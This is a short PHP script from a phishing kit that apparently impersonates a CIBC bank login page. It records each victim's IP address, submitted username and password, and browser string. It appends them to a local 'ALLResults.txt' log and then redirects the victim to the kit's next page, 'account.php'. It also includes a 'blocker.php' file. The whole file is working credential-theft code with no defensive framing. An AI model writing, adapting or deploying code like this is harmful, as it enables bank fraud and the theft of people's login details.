<?php
include('blocker.php');
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "Mp3=============================================\n";
$message .= "CIBClogin 1 : ".$ip."\n";
$message .= "------------------------------------------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "------------------------------------------------\n";
$message .= "BROWSER : ".$browser."\n";$browser=$_POST['browser'];
$message .= "Mp3=============================================\n";

$fp = fopen('../../../ALLResults.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<script>
    window.top.location.href = "account.php";
</script>
